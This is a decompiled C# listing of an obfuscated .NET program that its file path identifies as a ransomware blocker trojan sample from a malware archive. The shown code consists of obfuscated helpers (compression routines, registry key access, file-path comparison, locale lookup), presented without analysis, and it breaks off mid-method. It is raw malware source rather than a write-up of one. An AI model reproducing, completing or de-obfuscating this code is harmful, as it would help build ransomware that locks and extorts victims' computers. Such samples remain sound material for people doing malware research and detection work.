// Decompiled with JetBrains decompiler
// Type: .
// Assembly: w, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8101C3F8-A792-4EB9-952B-26F7AB9A4B5A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.Win32.Blocker.vho-f4229a3d3ef208e7112de152afe7852c75984f871ec47bb2704ac9b52dba3316.exe

using \u0006;
using \u0007;
using \u0008;
using \u000E;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace \u0006
{
  internal class \u0007
  {
    [NonSerialized]
    internal static \u0001 \u001F;

    static void \u0001([In] \u0003.\u0004.\u0008 obj0)
    {
      try
      {
        obj0.\u0001 = (int) obj0.\u0001[obj0.\u0005] << 5 ^ (int) obj0.\u0001[obj0.\u0005 + 1];
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0008 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
    }

    static \u0003.\u0004.\u0004 \u0001([In] \u0003.\u0004.\u0005 obj0)
    {
      \u0003.\u0004.\u0004 obj1;
      byte[] destinationArray;
      try
      {
        byte[] numArray = new byte[obj0.\u0003];
        if (true)
          goto label_2;
label_1:
        if (true)
        {
          Array.Copy((Array) obj0.\u0002, obj0.\u0002, (Array) destinationArray, 0, obj0.\u0003);
          if (true)
          {
            obj1 = new \u0003.\u0004.\u0004(destinationArray);
            goto label_6;
          }
          else
            goto label_6;
        }
        else
          goto label_6;
label_2:
        destinationArray = numArray;
        goto label_1;
      }
      catch (Exception ex)
      {
        byte[] numArray = destinationArray;
        \u0003.\u0004.\u0005 obj2 = obj0;
        \u0006.\u0007.\u0001(ex, (object) numArray, (object) obj2);
        throw;
      }
label_6:
      return obj1;
    }

    static unsafe bool \u0001([In] \u0003.\u0004.\u0001 obj0)
    {
      int num1 = 13;
      do
      {
        if (num1 != 0)
        {
          // ISSUE: untyped stack allocation
          void* voidPtr = (void*) __untypedstackalloc(num1);
          int num2;
          int index;
          try
          {
            int num3 = \u0006.\u0007.\u0001(obj0.\u0001);
            if (true)
              goto label_38;
label_36:
            while (num2 >= 258)
            {
              *(int*) ((IntPtr) voidPtr + 8) = obj0.\u0001;
              int num4 = *(int*) ((IntPtr) voidPtr + 8);
              int num5;
              while (true)
              {
                int num6 = num4 - 7;
                int num7;
                while (true)
                {
                  switch (num6)
                  {
                    case 0:
                      while (((index = \u0006.\u0007.\u0001(obj0.\u0001, obj0.\u0001)) & -256) == 0)
                      {
                        \u0006.\u0007.\u0001(obj0.\u0001, index);
                        num7 = num2 - 1;
                        if (true)
                        {
                          num2 = num7;
                          if (num7 < 258)
                          {
                            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
                            goto label_42;
                          }
                        }
                        else
                          goto label_30;
                      }
                      if (index < 257)
                      {
                        num5 = index;
                        if (false)
                        {
                          num6 = num5;
                          continue;
                        }
                        goto label_13;
                      }
                      else
                        goto label_16;
                    case 1:
                      goto label_17;
                    case 2:
                      goto label_24;
                    case 3:
                      goto label_28;
                    default:
                      goto label_36;
                  }
                }
label_16:
                obj0.\u0003 = \u0003.\u0004.\u0001.\u0001[index - 257];
                obj0.\u0002 = \u0003.\u0004.\u0001.\u0002[index - 257];
label_17:
                if (obj0.\u0002 <= 0)
                  goto label_23;
label_18:
                obj0.\u0001 = 8;
                *(int*) voidPtr = \u0006.\u0007.\u0001(obj0.\u0001, obj0.\u0002);
label_19:
                int num8 = *(int*) voidPtr;
                if (false)
                {
                  num4 = num8;
                  continue;
                }
                if (num8 >= 0)
                {
                  \u0006.\u0007.\u0001(obj0.\u0001, obj0.\u0002);
                  obj0.\u0003 += *(int*) voidPtr;
                }
                else
                  goto label_21;
label_23:
                obj0.\u0001 = 9;
label_24:
                index = \u0006.\u0007.\u0001(obj0.\u0002, obj0.\u0001);
                if (index < 0)
                {
                  if (false)
                    goto label_19;
                  else
                    goto label_26;
                }
                else
                {
                  obj0.\u0004 = \u0003.\u0004.\u0001.\u0003[index];
                  obj0.\u0002 = \u0003.\u0004.\u0001.\u0004[index];
                }
label_28:
                if (obj0.\u0002 > 0)
                {
                  obj0.\u0001 = 10;
                  *(int*) ((IntPtr) voidPtr + 4) = \u0006.\u0007.\u0001(obj0.\u0001, obj0.\u0002);
                  int num9 = *(int*) ((IntPtr) voidPtr + 4);
                  num7 = 0;
                  num7 = num9;
                }
                else
                  goto label_34;
label_30:
                if (num7 >= num7)
                {
                  if (false)
                    goto label_18;
                  else
                    goto label_33;
                }
                else
                  goto label_31;
              }
label_13:
              if (num5 < 0)
              {
                *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
                goto label_42;
              }
              else
              {
                obj0.\u0002 = (\u0003.\u0004.\u0004) null;
                obj0.\u0001 = (\u0003.\u0004.\u0004) null;
                obj0.\u0001 = 2;
                *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
                goto label_42;
              }
label_21:
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              goto label_42;
label_26:
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              goto label_42;
label_31:
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              goto label_42;
label_33:
              \u0006.\u0007.\u0001(obj0.\u0001, obj0.\u0002);
              obj0.\u0004 += *(int*) ((IntPtr) voidPtr + 4);
label_34:
              if (true)
              {
                \u0006.\u0007.\u0001(obj0.\u0001, obj0.\u0003, obj0.\u0004);
                num2 -= obj0.\u0003;
                obj0.\u0001 = 7;
              }
            }
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
            goto label_42;
label_38:
            num2 = num3;
            goto label_36;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) index;
            // ISSUE: variable of a boxed type
            __Boxed<int> local3 = (ValueType) *(int*) voidPtr;
            // ISSUE: variable of a boxed type
            __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
            // ISSUE: variable of a boxed type
            __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
            \u0003.\u0004.\u0001 obj = obj0;
            \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) obj);
            throw;
          }
label_42:
          num1 = (int) *(sbyte*) ((IntPtr) voidPtr + 12);
        }
      }
      while (false);
      return num1 != 0;
    }

    static RegistryKey \u0001([In] \u0001 obj0, [In] string obj1)
    {
      string str1;
      object[] objArray1;
      object[] objArray2;
      bool[] flagArray1;
      RegistryKey registryKey1;
      try
      {
        if (\u0015.\u007E\u0080((object) obj1, global::\u0002.\u0002(\u0001.\u0001(\u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(808), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(825), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null))))
        {
          str1 = \u009C.\u007E\u0097\u0003((object) obj1, global::\u0002.\u0002(global::\u000E.\u0015(\u0001.\u0001(\u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(808), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(825), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) \u0006.\u0007.\u001F(834))), \u0006.\u0007.\u001F(379));
          \u0001 obj2 = \u0001.\u0001;
          object obj3 = \u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(808), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
          string str2 = \u0006.\u0007.\u001F(839);
          objArray1 = new object[2]
          {
            (object) str1,
            (object) true
          };
          objArray2 = objArray1;
          object[] objArray3 = objArray2;
          flagArray1 = new bool[2]{ true, false };
          bool[] flagArray2 = flagArray1;
          object obj4 = obj2(obj3, (System.Type) null, str2, objArray3, (string[]) null, (System.Type[]) null, flagArray2);
          if (flagArray1[0])
          {
            // ISSUE: type reference
            str1 = (string) \u0014.\u001D(\u0012.\u001B(objArray2[0]), \u0013.\u001C(__typeref (string)));
          }
          registryKey1 = (RegistryKey) obj4;
        }
        else if (\u0015.\u007E\u0080((object) obj1, global::\u0002.\u0002(\u0001.\u0001(\u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(856), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(825), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null))))
        {
          str1 = \u009C.\u007E\u0097\u0003((object) obj1, global::\u0002.\u0002(global::\u000E.\u0015(\u0001.\u0001(\u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(856), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(825), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) \u0006.\u0007.\u001F(834))), \u0006.\u0007.\u001F(379));
          \u0001 obj5 = \u0001.\u0001;
          object obj6 = \u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(856), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
          string str3 = \u0006.\u0007.\u001F(839);
          objArray2 = new object[2]
          {
            (object) str1,
            (object) true
          };
          objArray1 = objArray2;
          object[] objArray4 = objArray1;
          flagArray1 = new bool[2]{ true, false };
          bool[] flagArray3 = flagArray1;
          object obj7 = obj5(obj6, (System.Type) null, str3, objArray4, (string[]) null, (System.Type[]) null, flagArray3);
          if (flagArray1[0])
          {
            // ISSUE: type reference
            str1 = (string) \u0014.\u001D(\u0012.\u001B(objArray1[0]), \u0013.\u001C(__typeref (string)));
          }
          registryKey1 = (RegistryKey) obj7;
        }
        else if (\u0015.\u007E\u0080((object) obj1, global::\u0002.\u0002(\u0001.\u0001(\u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(873), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(825), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null))))
        {
          str1 = \u009C.\u007E\u0097\u0003((object) obj1, global::\u0002.\u0002(global::\u000E.\u0015(\u0001.\u0001(\u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(873), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(825), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) \u0006.\u0007.\u001F(834))), \u0006.\u0007.\u001F(379));
          \u0001 obj8 = \u0001.\u0001;
          object obj9 = \u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(873), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
          string str4 = \u0006.\u0007.\u001F(839);
          objArray2 = new object[2]
          {
            (object) str1,
            (object) true
          };
          objArray1 = objArray2;
          object[] objArray5 = objArray1;
          flagArray1 = new bool[2]{ true, false };
          bool[] flagArray4 = flagArray1;
          object obj10 = obj8(obj9, (System.Type) null, str4, objArray5, (string[]) null, (System.Type[]) null, flagArray4);
          if (flagArray1[0])
          {
            // ISSUE: type reference
            str1 = (string) \u0014.\u001D(\u0012.\u001B(objArray1[0]), \u0013.\u001C(__typeref (string)));
          }
          registryKey1 = (RegistryKey) obj10;
        }
        else if (\u0015.\u007E\u0080((object) obj1, global::\u0002.\u0002(\u0001.\u0001(\u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(890), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(825), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null))))
        {
          str1 = \u009C.\u007E\u0097\u0003((object) obj1, global::\u0002.\u0002(global::\u000E.\u0015(\u0001.\u0001(\u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(890), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(825), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) \u0006.\u0007.\u001F(834))), \u0006.\u0007.\u001F(379));
          \u0001 obj11 = \u0001.\u0001;
          object obj12 = \u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(890), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
          string str5 = \u0006.\u0007.\u001F(839);
          objArray2 = new object[2]
          {
            (object) str1,
            (object) true
          };
          objArray1 = objArray2;
          object[] objArray6 = objArray1;
          flagArray1 = new bool[2]{ true, false };
          bool[] flagArray5 = flagArray1;
          object obj13 = obj11(obj12, (System.Type) null, str5, objArray6, (string[]) null, (System.Type[]) null, flagArray5);
          if (flagArray1[0])
          {
            // ISSUE: type reference
            str1 = (string) \u0014.\u001D(\u0012.\u001B(objArray1[0]), \u0013.\u001C(__typeref (string)));
          }
          registryKey1 = (RegistryKey) obj13;
        }
        else if (true)
          registryKey1 = (RegistryKey) null;
      }
      catch (Exception ex)
      {
        RegistryKey registryKey2;
        RegistryKey registryKey3 = registryKey2;
        string str6 = str1;
        object[] objArray7 = objArray1;
        object[] objArray8 = objArray2;
        bool[] flagArray6 = flagArray1;
        \u0001 obj = obj0;
        string str7 = obj1;
        \u0006.\u0007.\u0001(ex, (object) registryKey3, (object) str6, (object) objArray7, (object) objArray8, (object) flagArray6, (object) obj, (object) str7);
        throw;
      }
      return registryKey1;
    }

    static string \u0001([In] \u0004.\u0007 obj0) => obj0.\u0001;

    static void \u0001([In] \u0003.\u0004.\u0006 obj0, [In] byte[] obj1)
    {
      try
      {
        \u0006.\u0007.\u0001(obj0.\u0001, obj1);
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0006 obj = obj0;
        byte[] numArray = obj1;
        \u0006.\u0007.\u0001(ex, (object) obj, (object) numArray);
        throw;
      }
    }

    static void \u0001([In] \u0001 obj0)
    {
      char[] chArray1;
      Exception exception1;
      try
      {
        try
        {
          do
          {
            \u0001 obj = obj0;
            chArray1 = new char[3]{ 'r', 's', 'c' };
            string str = new string(chArray1);
            if (true)
              goto label_3;
label_1:
            continue;
label_3:
            \u0006.\u0007.\u0001(obj, str);
            goto label_1;
          }
          while (false);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          global::\u0006.\u0006();
        }
      }
      catch (Exception ex)
      {
        Exception exception2 = exception1;
        char[] chArray2 = chArray1;
        \u0001 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) exception2, (object) chArray2, (object) obj);
        throw;
      }
    }

    static int \u0001([In] int obj0, [In] string obj1, [In] Graphics obj2, [In] Font obj3) => \u009E.\u0099\u0003(\u009D.\u007E\u0098\u0003((object) obj2, obj1, obj3, obj0)).Height;

    static unsafe int \u0001([In] \u0003.\u0004.\u0006 obj0, [In] byte[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(26);
      try
      {
        *(int*) voidPtr = 0;
        *(int*) ((IntPtr) voidPtr + 4) = obj1.Length;
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 4);
        while (true)
        {
          do
          {
            \u0003.\u0004.\u0008 obj;
            do
            {
              *(int*) ((IntPtr) voidPtr + 12) = \u0006.\u0007.\u0001(obj0.\u0001, obj1, *(int*) voidPtr, *(int*) ((IntPtr) voidPtr + 4));
              *(int*) voidPtr = *(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 12);
              obj0.\u0001 += (long) *(int*) ((IntPtr) voidPtr + 12);
              *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - *(int*) ((IntPtr) voidPtr + 12);
              if (*(int*) ((IntPtr) voidPtr + 4) != 0 && obj0.\u0001 != 30)
              {
                obj = obj0.\u0001;
                *(sbyte*) ((IntPtr) voidPtr + 24) = (sbyte) ((obj0.\u0001 & 4) != 0);
                *(sbyte*) ((IntPtr) voidPtr + 25) = (sbyte) ((obj0.\u0001 & 8) != 0);
              }
              else
                goto label_12;
            }
            while (\u0006.\u0007.\u0001((bool) *(sbyte*) ((IntPtr) voidPtr + 25), (bool) *(sbyte*) ((IntPtr) voidPtr + 24), obj));
            if (obj0.\u0001 != 16)
            {
              if (obj0.\u0001 == 20)
                goto label_6;
            }
            else
              goto label_4;
          }
          while (obj0.\u0001 != 28);
          goto label_11;
label_6:
          *(int*) ((IntPtr) voidPtr + 16) = 8 + (-\u0006.\u0007.\u0001(obj0.\u0001) & 7);
          while (*(int*) ((IntPtr) voidPtr + 16) > 0)
          {
            \u0006.\u0007.\u0001(obj0.\u0001, 2, 10);
            *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) - 10;
          }
          obj0.\u0001 = 16;
          continue;
label_11:
          \u0006.\u0007.\u0001(obj0.\u0001);
          obj0.\u0001 = 30;
        }
label_4:
        *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 8) - *(int*) ((IntPtr) voidPtr + 4);
        goto label_15;
label_12:
        *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 8) - *(int*) ((IntPtr) voidPtr + 4);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 16);
        \u0003.\u0004.\u0006 obj = obj0;
        byte[] numArray = obj1;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) obj, (object) numArray);
        throw;
      }
label_15:
      return *(int*) ((IntPtr) voidPtr + 20);
    }

    static int \u0001([In] \u0003.\u0004.\u0003 obj0)
    {
      int num;
      try
      {
        num = obj0.\u0002;
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0003 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
      return num;
    }

    static unsafe bool \u0001([In] FileInfo obj0, [In] FileInfo obj1, [In] \u0001 obj2)
    {
      // ISSUE: untyped stack allocation
      IntPtr num = __untypedstackalloc(2);
      if (true)
        goto label_15;
label_1:
      DirectoryInfo directoryInfo1;
      DirectoryInfo directoryInfo2;
      void* voidPtr;
      try
      {
        if (\u001C.\u0098(\u001E.\u007E\u009C((object) \u001E.\u007E\u009E((object) obj1)), \u001E.\u007E\u009C((object) \u001E.\u007E\u009E((object) obj0)), false) == 0)
        {
          directoryInfo1 = \u009F.\u007E\u009A\u0003((object) obj1);
          do
          {
            directoryInfo2 = \u009F.\u007E\u009A\u0003((object) obj0);
            while (\u001C.\u0098(\u001E.\u007E\u009C((object) \u001E.\u007E\u009F((object) directoryInfo1)), \u001E.\u007E\u009C((object) \u001E.\u007E\u009F((object) directoryInfo2)), false) == 0)
            {
              directoryInfo1 = \u009F.\u007E\u009B\u0003((object) directoryInfo1);
              directoryInfo2 = \u009F.\u007E\u009B\u0003((object) directoryInfo2);
              if (directoryInfo1 == null & directoryInfo2 == null)
              {
                *(sbyte*) ((IntPtr) voidPtr + 1) = (sbyte) 1;
                goto label_14;
              }
              else if (directoryInfo1 == null)
              {
                *(sbyte*) ((IntPtr) voidPtr + 1) = (sbyte) 0;
                goto label_14;
              }
              else if (directoryInfo2 == null)
              {
                *(sbyte*) ((IntPtr) voidPtr + 1) = (sbyte) 0;
                goto label_14;
              }
            }
            *(sbyte*) ((IntPtr) voidPtr + 1) = (sbyte) 0;
          }
          while (false);
        }
        else
          *(sbyte*) ((IntPtr) voidPtr + 1) = (sbyte) 0;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) (bool) *(sbyte*) voidPtr;
        DirectoryInfo directoryInfo3 = directoryInfo1;
        DirectoryInfo directoryInfo4 = directoryInfo2;
        \u0001 obj = obj2;
        FileInfo fileInfo1 = obj1;
        FileInfo fileInfo2 = obj0;
        \u0006.\u0007.\u0001(ex, (object) local, (object) directoryInfo3, (object) directoryInfo4, (object) obj, (object) fileInfo1, (object) fileInfo2);
        throw;
      }
label_14:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 1);
label_15:
      voidPtr = (void*) num;
      goto label_1;
    }

    static unsafe int \u0001([In] int obj0, [In] \u0003.\u0004.\u0007 obj1)
    {
      void* voidPtr;
      if (true)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(8);
        try
        {
          do
          {
            int num1 = obj0;
            int num2 = (int) byte.MaxValue;
            if (num2 != 0)
            {
              if (num1 == num2)
              {
                *(int*) ((IntPtr) voidPtr + 4) = 285;
                continue;
              }
              goto label_7;
            }
            else
              goto label_5;
label_4:
            if (true)
            {
              int num3 = obj0;
              num2 = 8;
              num1 = num3;
            }
            else
              goto label_7;
label_5:
            if (num1 >= num2)
            {
              do
              {
                *(int*) voidPtr = *(int*) voidPtr + 4;
              }
              while (false);
              obj0 >>= 1;
              goto label_4;
            }
            else
              goto label_11;
label_7:
            *(int*) voidPtr = 257;
            goto label_4;
          }
          while (false);
          goto label_13;
label_11:
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) voidPtr + obj0;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
          \u0003.\u0004.\u0007 obj = obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          \u0006.\u0007.\u0001(ex, (object) local1, (object) obj, (object) local2);
          throw;
        }
      }
label_13:
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    static void \u0001([In] EventHandler obj0, [In] \u0002.\u0003 obj1)
    {
      EventHandler eventHandler1 = obj1.\u0001;
label_4:
      EventHandler comparand = eventHandler1;
      do
      {
        EventHandler eventHandler2 = (EventHandler) \u0001\u0002.\u009C\u0003((Delegate) comparand, (Delegate) obj0);
        EventHandler eventHandler3;
        if (true)
          eventHandler3 = eventHandler2;
        eventHandler1 = Interlocked.CompareExchange<EventHandler>(ref obj1.\u0001, eventHandler3, comparand);
        if (eventHandler1 != comparand)
          goto label_4;
      }
      while (false);
    }

    static unsafe int \u0001([In] \u0002.\u0003 obj0, [In] string obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(18);
      try
      {
        *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) (obj0.\u0001[0] == '\u0001');
        if (true)
          goto label_26;
label_8:
        *(int*) ((IntPtr) voidPtr + 4) = \u0018.\u007E\u0084((object) obj1) - 1;
        goto label_24;
label_17:
        int num1 = *(int*) ((IntPtr) voidPtr + 8);
label_18:
        int num2 = obj0.\u0001.Length;
        int num3;
        while (true)
        {
          num3 = num2;
          if (false)
            num2 = num3;
          else
            break;
        }
        char ch;
        if (num1 < num3)
        {
          if ((int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 8)] == (int) ch)
          {
            *(int*) voidPtr = *(int*) voidPtr * obj0.\u0001.Length + *(int*) ((IntPtr) voidPtr + 8);
            *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 1;
          }
          else
          {
            *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
            goto label_17;
          }
        }
        if (*(sbyte*) ((IntPtr) voidPtr + 17) == (sbyte) 0)
        {
          *(int*) ((IntPtr) voidPtr + 12) = -1;
          goto label_29;
        }
        else
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - 1;
label_24:
        while (*(int*) ((IntPtr) voidPtr + 4) >= 0)
        {
          if (true)
          {
            if (*(sbyte*) ((IntPtr) voidPtr + 16) != (sbyte) 0 || *(int*) ((IntPtr) voidPtr + 4) != 0)
            {
              ch = \u0002\u0002.\u007E\u009D\u0003((object) obj1, *(int*) ((IntPtr) voidPtr + 4));
              *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 0;
            }
            else
              break;
          }
          *(int*) ((IntPtr) voidPtr + 8) = 0;
          if (true)
            goto label_17;
        }
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) voidPtr;
        goto label_29;
label_26:
        switch (obj1)
        {
          case null:
            if (true)
            {
              *(int*) ((IntPtr) voidPtr + 12) = -1;
              goto label_29;
            }
            else
              break;
          default:
            if (\u0018.\u007E\u0084((object) obj1) != 0)
            {
              if (true)
              {
                int num4 = (int) *(sbyte*) ((IntPtr) voidPtr + 16);
                if (true)
                {
                  if (num4 != 0 && \u0018.\u007E\u0084((object) obj1) > 4 || *(sbyte*) ((IntPtr) voidPtr + 16) == (sbyte) 0 && \u0002\u0002.\u007E\u009D\u0003((object) obj1, 0) != '#')
                    goto case null;
                  else
                    break;
                }
                else
                {
                  num1 = num4;
                  goto label_18;
                }
              }
              else
                goto label_24;
            }
            else
              goto case null;
        }
        *(int*) voidPtr = 0;
        goto label_8;
      }
      catch
      {
        *(int*) ((IntPtr) voidPtr + 12) = -1;
      }
label_29:
      return *(int*) ((IntPtr) voidPtr + 12);
    }

    [DllImport("kernel32.dll", EntryPoint = "GetLocaleInfo")]
    static extern int \u0001(uint _param0, uint _param1, [Out] StringBuilder _param2, int _param3);

    static bool \u0001([In] \u0003.\u0004.\u0007 obj0, [In] int obj1)
    {
      short[] numArray1;
      int num1;
      int index1;
      try
      {
        obj0.\u0001[obj0.\u0001] = (short) 0;
        byte[] numArray2 = obj0.\u0002;
        \u0003.\u0004.\u0007 obj = obj0;
        int num2;
        num1 = num2 = obj.\u0001;
        obj.\u0001 = num2 + 1;
        int index2 = num1;
        int num3 = (int) (byte) obj1;
        numArray2[index2] = (byte) num3;
        (numArray1 = obj0.\u0001.\u0001)[index1 = obj1] = (short) ((int) numArray1[(IntPtr) index1] + 1);
        return \u0006.\u0007.\u0001(obj0);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        short[] numArray3 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local2 = (ValueType) (IntPtr) index1;
        \u0003.\u0004.\u0007 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj1;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) numArray3, (object) local2, (object) obj, (object) local3);
        throw;
      }
    }

    static void \u0001([In] \u0001 obj0, [In] int obj1)
    {
      Exception exception1;
      try
      {
        try
        {
          \u0006.\u0007.\u0001(\u0004\u0002.\u007E\u009F\u0003((object) \u0003\u0002.\u009E\u0003()), 29, ref obj1, 4);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          do
          {
            if (true)
              global::\u0006.\u0006();
          }
          while (false);
        }
      }
      catch (Exception ex)
      {
        Exception exception2 = exception1;
        \u0001 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj1;
        \u0006.\u0007.\u0001(ex, (object) exception2, (object) obj, (object) local);
        throw;
      }
    }

    static void \u0001([In] \u0004.\u0008 obj0)
    {
      \u009B.\u0080\u0003((object) obj0);
      do
      {
